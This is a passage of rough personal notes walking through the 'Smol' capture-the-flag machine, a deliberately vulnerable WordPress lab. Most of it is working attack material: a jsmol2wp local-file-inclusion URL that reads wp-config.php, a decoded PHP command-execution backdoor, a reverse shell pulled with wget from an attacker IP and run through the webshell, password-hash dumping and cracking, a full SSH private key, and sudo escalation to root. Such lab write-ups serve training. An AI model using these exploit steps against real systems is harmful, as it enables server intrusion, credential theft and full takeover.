@@ -1,0 +1,317 @@
+Nmap 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+* * *
+Jose Mario Llado Marti
+Founder, AnotherCTF
+admin@smol.thm
+* * *
+
+kali@kali:~/Downloads$ ssh jose@10.10.212.59
+jose@10.10.212.59: Permission denied (publickey).
+
+::: So we need to find a Key:
+
+::::
+:::
+GOBUSTER:
+/.php                 (Status: 403) [Size: 277]
+/.html                (Status: 403) [Size: 277]
+/index.php            (Status: 301) [Size: 0] [--> http://www.smol.thm/]
+/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
+/wp-login.php         (Status: 200) [Size: 4537]
+/license.txt          (Status: 200) [Size: 19915]
+/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
+/wp-trackback.php     (Status: 200) [Size: 135]
+/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
+
+
+We use the /wp-login.php and get to the login page:
+
+* * *
+WE WILL TRY TO USE THE admin@smol.thm AND USE THE FORGET PASSWORD OPTION AND TRY TO BYPASS THE SAFTY PRECAUTIONS (IF POSSIBLE)
+::DID NOT WORK
+* * *
+* * *
+We tried to Fuzz the "www" parameter in the http://www.smol.thm
+DID NOT WORK
+* * *
+
+WE WILL USE  WP SCAN :
+we know through the wappalizer that the site is using the Wordpress version 6.7.1 which  may be volnerable:
+we will use the " wpscan " for finding anything:
+
+:::::wpscan --url http://www.smol.thm -e ap
+
+:::::
+http://www.smol.thm/xmlrpc.php
+
+faultCode -32700 faultString parse error. not well formed { document.currentScript.dataset.injected = true; const o = JSON.parse(decodeURIComponent(escape(atob('eyJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImFwcFZlcnNpb24iOiI1LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIFNhZmFyaS81MzcuMzYiLCJwbGF0Zm9ybSI6IkxpbnV4IiwidmVuZG9yIjoiR29vZ2xlIEluYy4iLCJwcm9kdWN0IjoiR2Vja28iLCJvc2NwdSI6IltkZWxldGVdIiwiYnVpbGRJRCI6IltkZWxldGVdIiwicHJvZHVjdFN1YiI6IjIwMDMwMTA3IiwidXNlckFnZW50RGF0YUJ1aWxkZXIiOnsicCI6eyJ1YSI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3NlciI6eyJuYW1lIjoiQ2hyb21lIiwidmVyc2lvbiI6IjEyNC4wLjAuMCIsIm1ham9yIjoiMTI0In0sImVuZ2luZSI6eyJuYW1lIjoiQmxpbmsiLCJ2ZXJzaW9uIjoiMTI0LjAuMC4wIn0sIm9zIjp7Im5hbWUiOiJMaW51eCIsInZlcnNpb24iOiJ4ODZfNjQifSwiZGV2aWNlIjp7fSwiY3B1Ijp7ImFyY2hpdGVjdHVyZSI6ImFtZDY0In19LCJ1YSI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjAuMCBTYWZhcmkvNTM3LjM2In19')))); if (o.userAgentDataBuilder) { const v = new class NavigatorUAData { #p; constructor({p, ua}) { this.#p = p; const version = p.browser.major; const name = p.browser.name === 'Chrome' ? 'Google Chrome' : p.browser.name; this.brands = [{ brand: name, version }, { brand: 'Chromium', version }, { brand: 'Not=A?Brand', version: '24' }]; this.mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua); // https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-CH-UA-Platform this.platform = 'Unknown'; if (p.os && p.os.name) { const name = p.os.name.toLowerCase(); if (name.includes('mac')) { this.platform = 'macOS'; } else if (name.includes('debian')) { this.platform = 'Linux'; } else { this.platform = p.os.name; } } } toJSON() { return { brands: this.brands, mobile: this.mobile, platform: this.platform }; } getHighEntropyValues(hints) { if (!hints || Array.isArray(hints) === false) { return Promise.reject(Error("Failed to execute 'getHighEntropyValues' on 'NavigatorUAData'")); } const r = this.toJSON(); if (hints.includes('architecture')) { r.architecture = this.#p?.cpu?.architecture || 'x86'; } if (hints.includes('bitness')) { r.bitness = '64'; } if (hints.includes('model')) { r.model = ''; } if (hints.includes('platformVersion')) { r.platformVersion = this.#p?.os?.version || '10.0.0'; } if (hints.includes('uaFullVersion')) { r.uaFullVersion = this.brands[0].version; } if (hints.includes('fullVersionList')) { r.fullVersionList = this.brands; } return Promise.resolve(r); } }(o.userAgentDataBuilder); navigator.__defineGetter__('userAgentData', () => { return v; }); } delete o.userAgentDataBuilder; for (const key of Object.keys(o)) { if (o[key] === '[delete]') { delete Object.getPrototypeOf(window.navigator)[key]; } else { navigator.__defineGetter__(key, () => { if (o[key] === 'empty') { return ''; } return o[key]; }); } } }
+
+WE FOUND THIS PIECE OF CODE IS A BOT THAT PREVENTS US FROM BRUTE FORCING NORMALY
+WE ARE SUGGESTED TO US BURP SUITE TO CAPTURE THE REQUEST AND THEN USE THE HYDRA OR CURL FOR BRUTEFORCING:
+IT DID NOT WORK::
+:::::
+
+:::
+Plugin found:(important)
+jsmol2wp
+ | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
+ | Latest Version: 1.07 (up to date)
+ | Last Updated: 2018-03-09T10:28:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.07 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
+
+
+Here we found that this plug in is vulnerable to local file inclusion:
+::
+exploit::
+http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
+?isform=true
+&call=getRawDataFromDatabase
+&query=php://filter/resource=../../../../wp-config.php
+
+::::::
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'wpuser' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+kbLSF2Vop#lw3rjDZ629*Z%G
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+::::::
+
+We now log in
+wpuser
+kbLSF2Vop#lw3rjDZ629*Z%G
+
+we are in as an admin:
+::: We find: in tasks for admin:
+
+1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
+
+We found CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=
+we decodes to :
+ if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
+::: What this does:
+Checks if the cmd parameter is present in the URL.
+
+If so, it runs the value of cmd as a system shell command on the server.
+
+🔧 Example usage:
+If this PHP file is deployed on a server at http://target.com/shell.php, an attacker could run:
+
+http://target.com/shell.php?cmd=whoami
+::::
+
+we have all the shell access with this:
+:::
+start the nc listenert
+nc -lnvp 4444
+Now we will upload the reverse shell:
+we created the shell in /tmp directory: 
+nano shell.pl
+python3 -m http.server 81
+
+ON THE WEBSHELL:
+wget http://10.21.129.108:8000/shell.pl -O /tmp/shell.pl
+chmod + /tmp/shell.pl
+
+
+on the webshell command:
+http://www.smol.thm/wp-admin/edit.php?cmd=perl /tmp/shell.pl
+
+STABALIZE THE SHELL:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+
+WE WILL USE THE CREDENTIALS TO ENUMERATE THE DATABSE THAT WE GOT EARLIER
+::
+1:www-data@smol:/$ mysql -u wpuser -p
+2:Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
+3:Select the database:::  USE wordpress;
+4: enumarate the users and passwords:
+mysql> SELECT user_login, user_pass FROM wp_users;
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
+| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
+| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
+| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
+| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
+| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 
+
+create a hash.txt file and store the hashes in it:
+use John the ripper tool:
+
+After cracking the hashes ,we find that we have one password but not the username :
+?:sandiegocalifornia
+
+we will try to enumerate the usernames:
+We find that the user to which we got our password is diego
+
+we will switch our user to diego
+::
+We found other interesting things in THink direcotry:
+
+1:
+cat: authorized_key: No such file or directory
+diego@smol:/home/think/.ssh$ cat authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEa2hCNjk1TKa4P7dvTHMRgiF0FuyeJyuue+QyM6B1unzFgqt86Ax6GuSsReNyqasW9nOnSGdWdtoLJRXy8OvLCysSK8rt3kgN5+ywf9GpGKc5jcURgT56TMqgf5Lr6M0Qp50wfsNqYuxfGwAblv8C+b4Wlaa83XJLmxN4J5hTTCwcw/5x8zVxhwOQNToeaIIDYbgPn64+W5IfXdNLXYmkXJTcSMdC9Xp68RF5yuIdJ9XQ/EyuvAkTI7BI9gDZztGViH61tueJBFUAYTQlq2juSoAk4pki5ccQgqEGcU4i3knmynqX9B9fFlhEwFqK7I2205jVvI3CPr8QTJB7VgzlyGG2Ymb9FaiDxToNl/wGAHYqhU3uTXVUbvj5yYUxsY/rGfWZAbqLa7cfpZxjUsBzQnVuHKkaw89wTTr3fiz2OsqI31eT0EbscKcOFjYDpsLpuIThSp9TeKQ1BkxfAK8Xy9gcPjN06BpQzw+qL3RYIYRwY+1N9b9097j5eipmZxU= think@ubuntuserver
+
+2:
+diego@smol:/home/think/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+3:
+diego@smol:/home/think/.ssh$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEa2hCNjk1TKa4P7dvTHMRgiF0FuyeJyuue+QyM6B1unzFgqt86Ax6GuSsReNyqasW9nOnSGdWdtoLJRXy8OvLCysSK8rt3kgN5+ywf9GpGKc5jcURgT56TMqgf5Lr6M0Qp50wfsNqYuxfGwAblv8C+b4Wlaa83XJLmxN4J5hTTCwcw/5x8zVxhwOQNToeaIIDYbgPn64+W5IfXdNLXYmkXJTcSMdC9Xp68RF5yuIdJ9XQ/EyuvAkTI7BI9gDZztGViH61tueJBFUAYTQlq2juSoAk4pki5ccQgqEGcU4i3knmynqX9B9fFlhEwFqK7I2205jVvI3CPr8QTJB7VgzlyGG2Ymb9FaiDxToNl/wGAHYqhU3uTXVUbvj5yYUxsY/rGfWZAbqLa7cfpZxjUsBzQnVuHKkaw89wTTr3fiz2OsqI31eT0EbscKcOFjYDpsLpuIThSp9TeKQ1BkxfAK8Xy9gcPjN06BpQzw+qL3RYIYRwY+1N9b9097j5eipmZxU= think@ubuntuserver
+
+
+WE WILL :
+save the rsa in::
+nano id_rsa
+then:
+chmod 600 id_rsa
+
+ssh -i id_rsa  think@10.10.17.129
+
+WE HAVE AN MIS CONFIGURATION HERE : which allows us to switch users without passowrd:
+su gege:
+
+
+unzip wordpress.old.zip
+Archive:  wordpress.old.zip
+[wordpress.old.zip] wordpress.old/wp-config.php password: 
+here we will use the password that we we got for the wp user:
+kbLSF2Vop#lw3rjDZ629*Z%G
+((it was not correct))
+
+:::
+We can transfer the file to our attack machine from the victime machine:
+1: start the python server on the VICTIM machine
+python3 -m http.server 8080
+
+2: get it on our attack mahchine:
+wget http://smol.thm:8080/wordpress.old.zip 
+
+Now we can use John even though its protected by password:
+:::: zip2john wordpress.old.zip 
+$pkzip$8*1*1*0*0*24*a31c*c2fb90b3964ce4863c047a66cc23c2468ea4fffe2124c38cb9c91659b31793de138ae891*1*0*0*24*a31c*7722f8032fb202c65e40d0d76a91cdfa948dc7e6857f209a06627320940fa5bcbb2603e6*1*0*0*24*a31c*592448eb70b5198cef005c60d3aeb3d78465376eaa5f465e1c2dd7c890d613102e284c88*1*0*0*24*a320*f87c1c69a82331ca288320268e6c556a6ddc31a03e519747bd7b811b6b837527c82abe0e*1*0*0*24*a320*dc42fd5700a7ab7a3353cc674906dec0d6b997d8d56cc90f1248d684df3382d4d8c3ea45*1*0*0*24*a320*c96021e04f0d8a5ce6f787365277b4c9966e228fe80a3d29bc67d14431ecbab621d9cb77*1*0*0*24*a320*35fe982e604f7d27fedd1406d97fc4e874ea7df806bda1fea74676d3510a698ec6a7a3ac*2*0*26*1a*8c9ae7e6*60ed*6c*0*26*a31c*7106504d46479d273327e56f5e3a9dd835ebf0bf28cc32c4cb9c0f2bb991b7acaaa97c9c3670*$/pkzip$::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-content/index.php, wordpress.old/wp-content/plugins/index.php, wordpress.old/wp-content/themes/index.php, wordpress.old/wp-includes/blocks/spacer/style.min.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.min.css, wordpress.old/wp-includes/blocks/spacer/style.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.css:wordpress.old.zip
+
+PAsswrod:
+hero_gege@hotmail.com
+
+Now back to gege terminal at the victim machine:
+we will unzip the file:
+
+cat wp-config.php
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'xavi' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
+
+
+Now we have a password for a user:
+now we can use ::
+sudo -l
+
+xavi@smol:~$ sudo -l
+[sudo] password for xavi: 
+Matching Defaults entries for xavi on smol:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User xavi may run the following commands on smol:
+    (ALL : ALL) ALL
+
+We have no password required condition with the xavi user:
+there for we can use 
+sudo su:
+and gain root user access:
